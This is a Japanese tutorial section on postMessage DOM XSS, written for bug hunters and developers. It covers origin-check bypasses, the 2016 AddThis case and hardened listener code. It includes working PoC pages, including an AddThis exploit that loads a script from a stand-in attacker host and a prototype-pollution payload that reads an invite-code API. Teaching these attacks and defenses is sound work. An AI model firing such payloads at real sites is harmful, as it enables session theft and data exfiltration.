- AddThis 100万サイトのpostMessage XSS（Detectify Labs）: https://labs.detectify.com/writeups/postmessage-xss-on-a-million-sites/
- postMessage脆弱性の高度な連鎖（Intigriti）: https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities

以下の解説は、これら3資料に加え、各記事が参照する一次資料（HackTricksのpostMessageページ、PayloadsAllTheThingsのXSSインジェクション集、DOMPurifyの修正履歴など）で技術的な裏付けを補強しています。

---

### postMessage APIの基礎 — なぜ「窓をまたぐ通信」が必要なのか

#### 出発点: 同一オリジンポリシー（Same-Origin Policy, SOP）

ブラウザには **同一オリジンポリシー（Same-Origin Policy。以下SOP。あるオリジンのページのスクリプトが、別オリジンのページの中身やDOMに勝手にアクセスするのを禁止するセキュリティの大原則）** があります。ここでいう **オリジン（origin）** とは「スキーム（http/https）＋ホスト名＋ポート番号」の三つ組のことで、この三つが完全に一致して初めて「同一オリジン」とみなされます。たとえば `https://example.com` と `https://sub.example.com` はホスト名が違うので別オリジン、`https://example.com` と `http://example.com` はスキームが違うので別オリジンです。

SOPがあるおかげで、悪意あるサイト `attacker.com` の中に開いた `bank.com` のiframeの中身を、`attacker.com` のスクリプトが読み取ることはできません。しかし現実のWebアプリは、**あえてオリジンをまたいで安全にデータをやり取りしたい**場面が山ほどあります。たとえば、

- 親ページと、その中に埋め込んだ別オリジンのiframe（決済ウィジェット、地図、SNSシェアボタン、動画プレイヤー）が連携したい
- OAuth認証で開いたポップアップ窓（`window.open` で開いた認可サーバの画面）が、認証完了を親ページに知らせたい
- 別ドメインのチャットウィジェットが、親ページに「新着メッセージあり」を通知したい

こうした「SOPの壁を越えた、意図的で安全な通信路」を提供するために用意されたのが `window.postMessage()` です。

#### 送信側の構文

送信は次の形で行います。

```javascript
targetWindow.postMessage(message, targetOrigin, [transfer]);
```

- **`targetWindow`**: メッセージの送り先となる別のウィンドウオブジェクト。`iframe.contentWindow`（埋め込みiframe）、`window.open(...)` の戻り値（開いたポップアップ）、`window.parent`（自分を埋め込んでいる親）、`window.opener`（自分を開いた元の窓）などを指します。
- **`message`**: 送るデータ。文字列でも、構造化クローンアルゴリズムでコピー可能なオブジェクト（配列・プレーンオブジェクトなど）でも渡せます。
- **`targetOrigin`**: **「このオリジンのウィンドウにしか配達するな」という指定。** ここに `'https://trusted.example.com'` のように具体的オリジンを書くと、受信側の現在のオリジンがそれと一致したときだけメッセージが届きます。`'*'`（ワイルドカード）を書くと**任意のオリジンに配達される**ため、後述するとおり情報漏洩の温床になります。

例:

```javascript
// iframe に送る
document.getElementById('child').contentWindow.postMessage(
  { type: 'update', value: 42 },
  'https://widget.example.com'   // 具体オリジン指定（推奨）
);

// ポップアップに送る
const win = window.open('https://auth.example.com/login');
setTimeout(() => win.postMessage('ready', '*'), 2000); // '*' は危険
```

#### 受信側の構文 — ここに脆弱性が宿る

受信側は `message` イベントを購読（リッスン）します。

```javascript
window.addEventListener("message", (event) => {
  // event.origin : メッセージの「送信元オリジン」。ブラウザが自動でセットするため偽装できない
  // event.data   : 送られてきたデータ本体（taint source = 汚染源）
  // event.source : 送ってきたウィンドウオブジェクトへの参照
  if (event.origin !== "https://trusted.example.com") return; // オリジン検証
  console.log(event.data);
}, false);
```

ここで押さえるべき三つのプロパティが、そのまま攻防の焦点になります。

- **`event.origin`**: メッセージを送ってきた窓のオリジン。**この値は送信側のJavaScriptからは改竄できず、ブラウザが真実の値を入れてくれます。** だからこそ「本当に信頼できる相手からのメッセージか」を判定する唯一の確実な材料であり、これを**チェックし忘れる／甘くチェックする**ことがpostMessage XSSのほぼ全ての根本原因です。
- **`event.data`**: 送られてきたデータ。攻撃者が完全にコントロールできる **taint source（汚染源。ユーザー/攻撃者が制御でき、これがそのまま危険な処理に流れ込むとXSSになる入力の源泉）** です。
- **`event.source`**: 送ってきたウィンドウへの参照。「返信」に使えるほか、送信元の同一性チェックに使われることがあります（これも後述のとおりバイパス可能）。

> 出典: postMessage脆弱性入門（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/introduction-postmessage-vulnerabilities
> 出典: PostMessage Vulnerabilities（HackTricks、Intigriti記事のミラー的資料） — https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html

---

### 脆弱性の本質 — 二つの信頼境界が破れる

postMessageのセキュリティは「送信側」と「受信側」の二つの信頼境界からなり、それぞれ別種の脆弱性を生みます。

#### 受信側の欠陥（DOM XSSの主因）: オリジン検証の欠如

受信側の `message` ハンドラが `event.origin` を検証しないと、**世界中のどのサイトからでも** そのハンドラを起動できます。攻撃者は自分の用意したページ（`attacker.com`）に被害サイトをiframeで読み込むか、`window.open` で開き、そこへ任意の `event.data` を送りつけられます。

このとき `event.data` が **sink（シンク。ユーザー入力が最終的に実行・解釈されてしまう危険な代入先・実行点。DOM XSSの「着弾点」）** に無防備に流れ込むと、DOMベースXSSが成立します。代表的なsinkは次のとおりです。

- `element.innerHTML = event.data;` — 文字列がHTMLとしてパースされ、`<img src=x onerror=...>` などのイベントハンドラが発火
- `eval(event.data)` / `Function(event.data)()` / `setTimeout(event.data)` — 文字列がJavaScriptとして実行される
- `document.write(event.data)` — 文書ストリームにHTMLとして書き込まれる
- `location = event.data` / `location.href = event.data` — `javascript:` スキームを入れるとスクリプト実行
- `element.setAttribute('src', event.data)` を `<script>` や `<iframe>` に対して行う、`jQuery(event.data)` に渡す、など

最小限の脆弱なコードは次の通りです。

```javascript
// 脆弱: origin検証が一切ない
window.addEventListener("message", function (event) {
    document.body.innerHTML = event.data;  // sink = innerHTML
});
```

これに対する攻撃ページ（PoC）は次のようになります。

```html
<!-- attacker.com/exploit.html -->
<iframe src="https://victim.com/page-with-listener"
        onload="this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>','*')">
</iframe>
```

**なぜ動くのか**: iframeの `onload` で被害ページのロード完了を待ち、`contentWindow.postMessage(...)` で被害ページ内のリスナーへ文字列を送り込みます。被害ページはオリジンを確認しないため攻撃者からのメッセージを受理し、`innerHTML` に代入します。ブラウザのHTMLパーサはこの文字列を要素として解釈し、`<img>` の画像読み込みに失敗した瞬間 `onerror` 属性のJavaScriptを**被害ページのオリジン `victim.com` の権限で**実行します。`alert(document.domain)` が `victim.com` を表示すれば、攻撃者のスクリプトが被害オリジンで動いた＝XSS成立、という証明になります。送信側の `targetOrigin` に `'*'` を使っているのは、攻撃者は被害ページの正確なオリジンさえ書けば良く、`'*'` でも問題なく届くからです。

> 出典: postMessage脆弱性入門（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/introduction-postmessage-vulnerabilities
> 出典: Post Message XSS（HowToHunt, KathanP19、二次資料） — https://github.com/KathanP19/HowToHunt/blob/master/XSS/post_message_xss.md

YesWeHackの入門記事では、これをより現実的な題材で説明しています。あるゲーム風のデモページ（`rewards.html` と `start.html`）で、ユーザーが「Play」ボタンを押すと `pop1()` という関数が呼ばれ、`postMessage` で別ページへイベントが飛びます。受信側は「メッセージは自分のドメイン（例: `127.0.0.1`）から届くはずだ」と暗黙に前提しているのに、**送信元オリジンを検証していない**ため、攻撃者は同じ形のコードを自分のドメインに置き、`message` の中身を悪意あるJavaScriptペイロードに差し替えて送り込めば、被害ページ側でそれが処理されてしまう——という筋書きです。ポイントは「HTML5のpostMessageは `Event.data` を新たなtaint sourceとして持ち込む。これが安全でない形で扱われた瞬間にDOMベースXSSが発生する」という一般則です。

#### 送信側の欠陥: ワイルドカード `targetOrigin='*'` による情報漏洩

受信側だけでなく送信側にも罠があります。`postMessage(secret, '*')` のように `targetOrigin` を `'*'` にすると、**メッセージは配達先ウィンドウの現在のオリジンが何であっても配達されます。** つまり、攻撃者が被害ページを乗っ取って（あるいはiframeのlocationを差し替えて）配達先のオリジンを攻撃者オリジンに変えられる状況では、本来秘密であるはずのデータ（認証トークン、ユーザー情報など）が攻撃者に流出します。

PayloadsAllTheThings に載っている典型的なPoCは、この「送信側の緩さ」と「受信側でJSスキームがsinkに流れる」ことを組み合わせています。

```html
<html>
<body>
    <input type=button value="Click Me" id="btn">
</body>
<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('http://10.10.10.10/#login');
    setTimeout(function(){
        window.poc.postMessage(
            {
                "sender": "accounts",
                "url": "javascript:confirm('XSS')"
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
```

**なぜ動くのか**: 攻撃ページが被害アプリを `window.open` で開き、2秒待ってから `postMessage` で `{sender:"accounts", url:"javascript:confirm('XSS')"}` を送ります。被害アプリのリスナーが「`sender` が `accounts` なら `url` を信頼してリダイレクトに使う」ような実装で、しかも `location = msg.url` のようにsinkへ流していると、`javascript:` スキームのURLがナビゲーションとして評価され、被害オリジンでJavaScriptが走ります。ここでも受信側がオリジンを検証していないことが前提です。

> 出典: PayloadsAllTheThings — XSS Injection（swisskyrepo、二次資料） — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

#### 安全なコードとの対比

上記の脆弱例に対して、最低限守るべき安全形は次の通りです（詳細は本節末尾の防御策で展開します）。

```javascript
window.addEventListener("message", (event) => {
  // 1) 送信元オリジンを「完全一致」で許可リスト照合する
  if (event.origin !== "https://trusted.example.com") return;
  // 2) データの「形」を検証する（型・キー・値の範囲）
  let data;
  try { data = JSON.parse(event.data); } catch { return; }
  if (typeof data !== "object" || data.type !== "update") return;
  // 3) 危険なsinkには渡さない（innerHTML/eval等を避け、textContent等を使う）
  document.getElementById("status").textContent = String(data.value);
});
```

---

### 実例: AddThis 経由で100万サイトに影響した postMessage XSS

ここまでの原理が「机上の空論ではない」ことを、Detectify Labs の Mathias Karlsson が2016年12月15日に公開した実例で確認します。

#### 何が起きたか

**AddThis** は、ブログや記事の末尾によくある「SNSシェアボタン」を提供する第三者ウィジェットで、当時**100万を超えるサイト**に埋め込まれていました。AddThisのスクリプトを読み込んでいたそれら全サイトが、一斉に **DOMベースXSSに対して脆弱**だった、というのがこの事例の衝撃です。攻撃者はAddThisを使っている任意のページに、自分の好きなスクリプトを差し込めました。

#### 脆弱性の核心: 甘すぎるオリジン検証

AddThisの `postMessage` リスナーは、**送信元オリジンについて「HTTP/HTTPSのページであること」しか確認していませんでした。** つまり `event.origin` が `http://` か `https://` で始まりさえすれば、どのドメインからのメッセージでも受理してしまう——これは事実上「誰でもOK」に等しい、名ばかりの検証です。攻撃者のサイトも当然HTTPSで配信されるからです。

さらにリスナーは、受け取ったメッセージが `at-share-bookmarklet:DATA` という形式であることを期待しており、`DATA` の部分を使って**外部からスクリプトファイルを読み込む**動作をしました（AddThisのブックマークレット共有機能に由来する挙動）。オリジンが実質ノーチェックなので、この `DATA` に攻撃者のスクリプトURLを入れれば、被害ページがそれをロードして実行してしまいます。

#### エクスプロイト

再構成された攻撃の骨子は次の通りです。

```html
<!-- attacker.com: AddThisを読み込む任意の被害ページを frame に入れて postMessage -->
<iframe id="frame" src="https://victim.com/page-that-uses-addthis"></iframe>
<script>
  // ページロード後、AddThisのリスナー宛てにブックマークレット形式のメッセージを送る
  setTimeout(function () {
    document.getElementById('frame').contentWindow.postMessage(
      'at-share-bookmarklet://ATTACKERDOMAIN/xss.js',  // DATA = 攻撃者のスクリプトURL
      '*'
    );
  }, 3000);
</script>
```

**なぜ動くのか**: 被害ページ内で動いているAddThisのリスナーは、`event.origin` がHTTP(S)でありさえすれば受理します（攻撃者ページもHTTPSなので通過）。受理したメッセージが `at-share-bookmarklet:` で始まると、AddThisはその後続部分 `//ATTACKERDOMAIN/xss.js` を「読み込むべきスクリプトの場所」として解釈し、`xss.js` を被害ページのコンテキストで読み込み・実行します。結果として、攻撃者の任意JavaScriptが `victim.com` のオリジン権限で走り、Cookieの窃取・セッション乗っ取り・ページ改竄など何でもできてしまいます。1つの第三者スクリプトの検証漏れが、それを貼っている100万サイト全てのXSSに直結した、というのがこの事例の核心です。

#### 修正と教訓

修正は単純で、**未知のオリジンからのメッセージを弾く、まっとうなオリジン検証（許可リスト）を追加する**というものでした。AddThisのCTOに報告され、パッチは速やかに開発・配信されました。

Karlssonがこの記事で繰り返し強調する結論はこうです。**「第三者スクリプトを使うなら、そのスクリプト自身とその `postMessage` 実装を必ず精査せよ」。** 自社コードがどれだけ堅牢でも、貼り付けた広告・解析・シェアボタンのウィジェットが穴だらけなら、あなたのサイトのユーザーはそのまま危険にさらされます。攻撃対象を探すバグハンター視点で言えば、「広く使われている埋め込みウィジェットの `postMessage` リスナー」は、1つ落とせば大量のサイトに効く、費用対効果が極めて高いターゲットだということです。

> 出典: postMessage XSS on a million sites（Detectify Labs, Mathias Karlsson, 2016-12-15） — https://labs.detectify.com/writeups/postmessage-xss-on-a-million-sites/

---

### オリジン検証バイパス — 「一応チェックしている」を破る原理

多くの実装は `event.origin` を全く見ないわけではなく、「見てはいるが甘い」ことが問題です。ここが本節で最も原理的に面白い部分で、**JavaScriptの文字列メソッドや正規表現の仕様、ブラウザのオリジン割り当ての挙動**を突いてバイパスします。攻撃者がやるべきことは常に一つ、「そのチェックを**通ってしまう**オリジンを、自分が支配下に置ける形で用意する」ことです。

#### 1. `indexOf()` / 部分文字列マッチの罠

```javascript
// 脆弱: 「trustedドメインを含んでいればOK」という部分一致
window.addEventListener("message", (e) => {
  if (e.origin.indexOf("trusted.com") === -1) return;  // または !== 0
  document.body.innerHTML = e.data;
});
```

`String.prototype.indexOf` は「部分文字列がどこかに含まれるか」を返すだけです。したがって攻撃者は、**許可文字列を部分文字列として含むオリジン**を用意すれば通過できます。

- `indexOf("trusted.com") !== -1`（どこかに含まれればOK）の場合 → `https://trusted.com.attacker.com` や `https://attacker.com/?trusted.com` のようなドメイン/URLで通過。前者は `trusted.com` を接頭辞に持つ攻撃者管理ドメインです。
- `indexOf("https://app.marketo.com") === 0`（＝先頭一致 `startsWith` 相当）の場合でも、HackTricksが挙げる有名な例のように、`"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")` は `0` を返します。つまり `https://app-sj17.ma`（`.ma` はモロッコのTLD）という**実在しうる短いドメインで先頭一致を満たせる**わけです。

**なぜ動くのか**: `indexOf` はオリジンを「意味のある境界（ドット区切りのラベル）」として扱わず、ただのバイト列として部分一致を見るだけだからです。ドメインは右から左に階層が決まる（`a.b.com` の所有権は `b.com` の持ち主に属する）のに、部分文字列マッチはその構造を完全に無視します。

#### 2. 正規表現の落とし穴（`search()` と未エスケープのドット）

```javascript
// 脆弱: search() に「文字列」を渡している
if ("https://www.trusted.com".search(userOriginPattern) ) { ... }
// あるいは自前の正規表現でドットをエスケープしていない
const re = /^https:\/\/www.trusted.com$/;   // '.' が未エスケープ
if (re.test(e.origin)) { ... }
```

二つの別々のバグが同じ原理に帰着します。

- **`String.prototype.search()` は引数を正規表現として解釈します。** 文字列を渡しても暗黙に `RegExp` へ変換されるため、`.` などの正規表現メタ文字がそのまま特別扱いになります。HackTricksの例では `"https://www.safedomain.com".search("www.s.fedomain.com")` がマッチしてしまいます。
- **正規表現内の `.` は「任意の1文字」にマッチするワイルドカード**です。`/^https:\/\/www.trusted.com$/` は開発者の意図では `www.trusted.com` を表すつもりでも、実際には `www` の後の `.` が任意文字にマッチするため、`https://wwwXtrusted.com` のようなドメインでも通ります（`X` は任意の1文字）。攻撃者は `wwwatrusted.com` のような**別ドメインを取得**すれば検証を突破できます。同様に、末尾を `$` で固定していない `/^https:\/\/trusted\.com/` は `https://trusted.com.attacker.com` を許してしまいます。

**なぜ動くのか**: ドメイン名の照合を「正規表現の文字クラスとして」書いてしまうと、ドメインの区切り文字であるはずの `.` が、正規表現の世界では「なんでもいい1文字」という真逆の意味を持つからです。名前空間（ドメイン階層）の意味論と、正規表現のパターンマッチの意味論が食い違うところに穴が生まれます。

#### 3. `startsWith` / `endsWith` の誤用

```javascript
if (e.origin.startsWith("https://trusted.com")) { ... }  // → https://trusted.com.evil.com が通る
if (e.origin.endsWith("trusted.com")) { ... }            // → https://nottrusted.com が通る
```

**なぜ動くのか**: `startsWith` は右側に何が続いても許すのでサブドメイン偽装（`trusted.com.evil.com`）を許し、`endsWith` は左側に何が付いても許すので接頭辞偽装（`nottrusted.com`、`eviltrusted.com`）を許します。ドメインの所有権境界（ラベル境界の `.`）を見ないチェックは、方向を問わず必ず破れます。正しくは「**完全一致**」か「厳密なラベル境界を考慮した許可リスト照合」でなければなりません。

#### 4. `null` オリジン — サンドボックス化iframeの悪用

`event.origin` が信頼される正規の値そのものと一致するかを見る実装、特に `e.origin === window.origin`（＝「自分自身と同じオリジンからのメッセージか」）という比較にも抜け道があります。

```html
<iframe sandbox="allow-scripts allow-popups" src="https://victim.example/iframe.php"></iframe>
```

**なぜ動くのか**: `sandbox` 属性付きのiframeは、`allow-same-origin` を付けない限り**オリジンが `null` になります**。さらに `allow-popups-to-escape-sandbox` が無い状態でそのサンドボックス内から `window.open` でポップアップを開くと、ポップアップもサンドボックスと `null` オリジンを継承します。すると、そのポップアップ内で動くページから見た `window.origin` は `"null"`、送ってくるメッセージの `e.origin` も `"null"` になり、`e.origin === window.origin`（`"null" === "null"`）が**成立してしまいます**。攻撃者はこの `null` 同士の一致を使って「同一オリジン限定」のつもりの検証をすり抜けます。

#### 5. `e.source` チェックの `null` 化

一部の実装は「送ってきた窓が、自分が知っている窓（例: 自分が開いたiframe）と同一か」を `e.source` で確認します。

```javascript
if (e.source !== myIframe.contentWindow) return;  // 送信元ウィンドウの同一性チェック
```

これも回避可能です。**postMessageを送った直後に、送信元のiframeをDOMから削除する**と、受信側が `message` イベントを処理する頃には送信元ウィンドウが破棄され、`e.source` が `null` になります。攻撃者は比較対象の期待値も `null` になるよう仕向けたり、単に `e.source` ベースの分岐を無効化したりできます。

**なぜ動くのか**: `e.source` はライブなウィンドウ参照であり、そのウィンドウ（iframe）が消滅すると参照は `null` に落ちます。イベントの発火と処理の間にわずかな時間差があることを突いた、レースコンディション的なトリックです。

#### 6. サニタイズ関数（`escapeHtml`）自体のバイパス

「`event.data` を innerHTML に入れる前に自前の `escapeHtml` でエスケープしているから安全」という実装すら、関数の作りによっては破れます。HackTricmのミラーが挙げる例では次のようになります。

```javascript
// 期待どおり動くケース（プレーンオブジェクト）
result = u({message: "'\"<b>\\"});
result.message // => "&#39;&quot;&lt;b&gt;\"   （エスケープされる）

// バイパス（File や Error オブジェクトを渡す）
result = u(new Error("'\"<b>\\"));
result.message; // => "'"<b>\"                 （エスケープされない！）
```

**なぜ動くのか**: この種のエスケープ関数は、オブジェクトの各プロパティに対して `hasOwnProperty`（自分自身が直接持つプロパティかどうかの判定）でフィルタしてからエスケープする作りになっていることがあります。`File` や `Error` のようなビルトインオブジェクトの `message` は、その判定に期待どおり応答しない（プロトタイプ側のアクセサ経由であるなど）ため、**エスケープ処理のループから漏れて生の値が残ります**。攻撃者は「サニタイズ関数が想定していない型のオブジェクト」を `event.data` として送り込むことで、エスケープをすり抜けたペイロードをsinkへ届けます。

> なお、サニタイザのバイパスはライブラリのバージョンに強く依存します。たとえば著名なHTMLサニタイザ **DOMPurify** は、mutation XSS（mXSS。ブラウザがHTMLを再パースする際に文字列が別の意味の要素へ「変異」して解釈され、サニタイズをすり抜ける攻撃）を突く複数のバイパスが過去に報告され、**2.0.17 など特定バージョンで順次修正**されてきました。`event.data` をサニタイズしてからsinkに渡す設計を評価する際は、**どのサニタイザの、どのバージョンを使っているか**を必ず確認してください。古いバージョンには公開済みの回避手法が存在し得ます（陳腐化への注意: 個々のバイパスは修正されるため、常に対象バージョンと公開年をセットで捉えること）。

> 出典: postMessage脆弱性の高度な連鎖（Intigriti） — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities
> 出典: PostMessage Vulnerabilities（HackTricks、上記Intigriti記事に対応するミラー的資料。indexOf/search/null origin/e.source/escapeHtml バイパスの各コード例の出所） — https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html

---

### 高度な連鎖 — postMessage × プロトタイプ汚染 × CSP

上級者向けの実戦では、postMessageは「単独でXSSに至らないとき」に他の脆弱性クラスと連鎖させます。Intigritiの記事（およびそのミラー）が示す代表的な2パターンを解説します。

#### プロトタイプ汚染からのXSS

**プロトタイプ汚染（Prototype Pollution）** とは、JavaScriptの全オブジェクトが共有する大元のプロトタイプ（`Object.prototype`）を、`__proto__` というキーを通じて攻撃者が書き換えてしまう脆弱性です。JavaScriptでオブジェクトのプロパティを参照すると、そのオブジェクト自身に無ければ**プロトタイプチェーンを上へ辿って**探しにいきます。したがって `Object.prototype` に細工したプロパティを仕込むと、**アプリ内のあらゆるオブジェクトがそのプロパティを「持っているかのように」振る舞い**、後続の描画ロジックがそれを読み出してsinkに流すとXSSになります。

postMessageは、この汚染を注入する経路になり得ます。受信側が `event.data` を `JSON.parse` して既存オブジェクトへ再帰的にマージするような実装だと、`__proto__` 入りのJSONを送るだけで汚染できます。

```html
<html>
<body>
    <iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
    <script>
        function get_code() {
            document.getElementById('idframe').contentWindow.postMessage(
                '{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(r=>r.json()).then(d=>{alert(d[\'result\'][0][\'code\']);})\\" />"}}}',
                '*'
            );
            document.getElementById('idframe').contentWindow.postMessage(JSON.stringify("refresh"), '*');
        }
        setTimeout(get_code, 2000);
    </script>
</body>
</html>
```

**なぜ動くのか**: 1通目のメッセージで `{"__proto__":{"editedbymod":{"username":"<img ... onerror=...>"}}}` を送ると、受信側の再帰マージが `Object.prototype.editedbymod.username` に攻撃者のHTMLペイロードを書き込みます（プロトタイプ汚染）。以後、アプリ内のどのオブジェクトでも `obj.editedbymod.username` を読むとこのペイロードが返ります。2通目の `"refresh"` でアプリに再描画を促すと、描画ロジックが汚染された `username` を読み出して innerHTML 系のsinkに差し込み、`<img onerror>` が発火。ここでは `same-origin` のfetchで招待コード（invitecodes）APIを叩き、結果を `alert` に出す——という情報窃取まで一気に連鎖しています。postMessageが「汚染の注入口」、プロトタイプ汚染が「ペイロードの潜伏場所」、再描画が「sinkへの着火」という三段構えです。

#### CSPの `unsafe-eval` を利用した実行

**CSP（Content Security Policy。ページが読み込む/実行するリソースの出所をブラウザに制限させるヘッダベースの防御）** が効いていると、単純な `<script>` 注入は止められることがあります。しかしCSPに `script-src 'unsafe-eval'` が含まれていると、`eval()` や `Function()` による文字列→コード実行が許可されたままになります。Intigritiが示すCTF系の例では、正しいpostMessageチャネル経由で送ったコードが、`unsafe-eval` が有効なために `eval` 相当の処理で自動評価され、XSSが成立しました。

**なぜ動くのか**: CSPはソース許可リスト（どのオリジンのスクリプトを、どういう方法で実行してよいか）を上から評価しますが、`'unsafe-eval'` はそのリストに「文字列からのコード生成を許す」という抜け穴を明示的に開けてしまいます。postMessageのsinkが `eval(event.data)` 系であれば、CSPがあっても `'unsafe-eval'` の存在ゆえに素通しになります。CSPを回避するのではなく、**CSPの設定不備そのものを利用する**連鎖です。

> 出典: postMessage脆弱性の高度な連鎖（Intigriti） — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities
> 出典: PostMessage Vulnerabilities（HackTricks、プロトタイプ汚染PoCコードの出所） — https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html

---

### 発見のワークフロー — ハンティングの実務

postMessage脆弱性を実地で探す手順を、Intigriti/HackTrick系資料に基づいて整理します。

#### 1. メッセージリスナーを列挙する

対象ページを開き、ブラウザの開発者ツールのコンソールで次を実行します（Chrome系の場合）。

```javascript
getEventListeners(window)
```

`message` のエントリがあれば、その `listener` 関数のソースを展開して中身を読みます。GUIからは「Elements → 対象要素/window → Event Listeners タブ」でも確認できます。ソースコード（バンドルされたJS）に対しては、次のキーワードで grep します。

```
addEventListener("message"    /  addEventListener('message'
onmessage =
$(window).on("message"        （jQuery 経由）
```

#### 2. ハンドラを静的解析する（3つの問い）

見つけた `message` ハンドラごとに、次を確認します。

1. **オリジン検証はあるか、そして厳密か？** `event.origin` を一切見ていない／`indexOf`・`search`・`startsWith`・`endsWith`・未エスケープの正規表現で見ている、なら要注意（前節の各バイパスが適用できる）。
2. **`event.data` はどのsinkに到達するか？** `innerHTML`、`outerHTML`、`document.write`、`eval`/`Function`/`setTimeout(str)`、`location`/`location.href`、`element.src`（script/iframe）、`jQuery(...)`、`postMessage` の再送、`JSON.parse` 後の再帰マージ（プロトタイプ汚染）などへ流れていないか。
3. **データの「形」の検証はあるか？** 型・キー名・値の範囲チェックが無ければ、攻撃者は自由な `event.data` を送れる。

#### 3. PoCを組み立てる

対象ページがiframe埋め込みを禁止しているか（`X-Frame-Options` や CSP `frame-ancestors`）で手法を選びます。

- **iframe可の場合**: `<iframe src="victim" onload="this.contentWindow.postMessage(PAYLOAD,'*')">`
- **iframe不可（X-Frame-Options等あり）の場合**: `window.open` で新規タブに開く。

```html
<script>
  var w = window.open("https://victim.com/target");
  setTimeout(function () { w.postMessage(PAYLOAD, '*'); }, 2000);
</script>
```

**なぜ `window.open` で回避できるのか**: `X-Frame-Options` / `frame-ancestors` は「他サイトにiframeとして**埋め込まれる**こと」だけを防ぐ指定であり、`window.open` による**トップレベルの別窓表示**は妨げません。postMessageはトップレベル窓に対しても送れるため、埋め込み制限があってもハンドラは叩けます。

#### 4. 補助ツール

- **posta**（`benso-io/posta`）: ページ内の全postMessage通信を傍受・可視化し、リスナーの列挙やメッセージの再送（リプレイ）を支援。
- **postMessage-tracker**（`fransr/postMessage-tracker`）: 送受信されるメッセージと、それを処理するリスナーのスタックトレースを追跡するブラウザ拡張。

これらを使うと「どんなメッセージが、どのリスナーに、どう処理されているか」を実行時に観測でき、静的解析だけでは見落とすsinkへの経路を発見しやすくなります。

> 出典: postMessage脆弱性の高度な連鎖（Intigriti、発見手法・PoC構成） — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities
> 出典: PostMessage Vulnerabilities（HackTricks、getEventListeners / posta / postMessage-tracker / window.open 回避の出所） — https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html

---

### 防御策 — 正しい postMessage の書き方

最後に、これまでのバイパス手法を踏まえて「破れない」実装原則をまとめます。ポイントは**受信側・送信側の両方**を固めることです。

#### 受信側（最重要）

1. **オリジンは必ず「完全一致」で許可リスト照合する。** `indexOf`・`search`・`startsWith`・`endsWith`・正規表現による部分/曖昧一致は使わない。どうしても複数オリジンを許すなら、正規化した文字列の**完全一致の集合**で判定する。

   ```javascript
   const ALLOWED = new Set(["https://trusted.example.com", "https://widget.example.com"]);
   window.addEventListener("message", (event) => {
     if (!ALLOWED.has(event.origin)) return;   // 完全一致のみ
     // ...
   });
   ```

   **なぜこれで安全か**: `Set.has` はオリジン文字列の完全一致だけを真とするため、部分文字列偽装・サブドメイン偽装・正規表現ワイルドカードのいずれも成立しません。ドメインの所有権境界を文字列全体で判定していることになります。

2. **`event.data` の「形」を検証する。** 期待する型・キー・値域を明示的にチェックし、想定外のオブジェクト（`File`/`Error` など）や余分なキー（`__proto__` など）を拒否する。JSONをパースする場合は、再帰マージで `__proto__`/`constructor`/`prototype` を無視する安全なマージ関数を使う（プロトタイプ汚染対策）。

3. **危険なsinkを使わない。** `innerHTML`/`document.write`/`eval`/`Function`/`setTimeout(文字列)`/`location=` に `event.data` を直接渡さない。テキスト表示なら `textContent`、DOM生成なら安全なAPI（`createElement` + 属性の個別設定）を使う。サニタイズが必要なら**最新の**専用ライブラリ（DOMPurifyの最新版など）を用い、自前の `escapeHtml` に頼らない。

#### 送信側

4. **`targetOrigin` にワイルドカード `'*'` を使わない。** 送り先が確定しているなら、必ず具体的オリジンを書く。これにより、配達先窓のオリジンが攻撃者に差し替えられていても、意図しないオリジンへは配達されず、機密データの漏洩を防げる。

   ```javascript
   childWindow.postMessage(payload, "https://trusted.example.com");  // '*' にしない
   ```

#### 多層防御（フレーム/CSP）

5. **クリックジャッキング/埋め込み対策も併用する。** `X-Frame-Options: DENY`（または `SAMEORIGIN`）と CSP の `frame-ancestors` で、意図しないサイトからの埋め込みを禁止する。ただしこれは `window.open` 経由の攻撃までは防げないため、あくまで受信側の厳密なオリジン検証と組み合わせる補助策と位置づける。
6. **CSPを適切に絞る。** `script-src` から `'unsafe-eval'` と `'unsafe-inline'` を排除し、万一sinkにデータが届いても実行されにくくする。CSPは最後の安全網であって、オリジン検証の代わりにはならない。

要するに、postMessage防御の一丁目一番地は **「受信側で送信元オリジンを完全一致の許可リストで検証し、`event.data` の形を検証し、危険なsinkを避ける」** の三点セットであり、送信側の `targetOrigin` 明示とCSP/フレーム制限がそれを補強します。AddThisの事例が示したのは、この三点のうち最初の一点（厳密なオリジン検証）を怠っただけで、100万サイトが一斉にXSSへ転落したという事実です。

> 出典: postMessage脆弱性入門（YesWeHack、防御策とベストプラクティス） — https://www.yeswehack.com/learn-bug-bounty/introduction-postmessage-vulnerabilities
> 出典: postMessage XSS on a million sites（Detectify Labs、第三者スクリプト精査の教訓） — https://labs.detectify.com/writeups/postmessage-xss-on-a-million-sites/
> 出典: postMessage脆弱性の高度な連鎖（Intigriti、防御の総合） — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities

---

### この節のまとめ

- `postMessage` はSOPの壁を越えて安全に通信するためのAPIだが、**受信側が `event.origin` を検証しない／甘く検証する**と、攻撃者が任意の `event.data`（taint source）をsinkへ流し込めてDOM XSSになる。
- 送信側の `targetOrigin='*'` は情報漏洩を、受信側のsink（`innerHTML`/`eval`/`document.write`/`location`）への無防備な代入はコード実行を招く。
